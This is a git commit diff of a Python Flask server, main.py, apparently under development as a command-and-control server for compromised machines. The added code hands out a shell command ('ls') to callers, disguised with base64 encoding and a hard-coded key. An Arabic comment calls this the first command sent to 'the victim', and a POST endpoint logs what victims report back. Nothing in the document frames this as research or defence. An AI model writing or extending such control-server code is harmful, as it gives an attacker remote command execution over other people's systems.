76c11b4823a2406dac5dfa68b71fce6c6208bb13
deman210210 <kalshly851@gmail.com>
2025-08-04 05:09:44 +0300

    Update main.py
    CCC

--- main.py
+++ main.py
@@ -1,19 +1,31 @@
-from flask import Flask, request
+from flask import Flask, request, jsonify
+import base64
 
 app = Flask(__name__)
+
+KEY = b'DEMANX'
+
+def encrypt_cmd(cmd):
+    raw = base64.b64encode(cmd.encode())
+    return base64.b64encode(KEY + raw).decode()
 
 @app.route('/', methods=['GET'])
 def index():
     return "✅ السيرفر شغال!"
 
-@app.route('/receive', methods=['POST'])
+@app.route('/receive', methods=['POST', 'GET'])
 def receive():
-    data = request.get_json()
-    print("📩 وصلك أمر:", data)
-    return {"status": "ok"}
+    if request.method == 'POST':
+        data = request.get_json()
+        print("📩 وصلك أمر:", data)
+        return {"status": "ok"}
+    elif request.method == 'GET':
+        if request.args.get("cmd") == "1":
+            encrypted = encrypt_cmd("ls")  # أول أمر نرسله للضحية
+            return jsonify({"cmd": encrypted})
+        else:
+            return jsonify({"cmd": ""})
+    return "Invalid method", 405
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
-
-
-
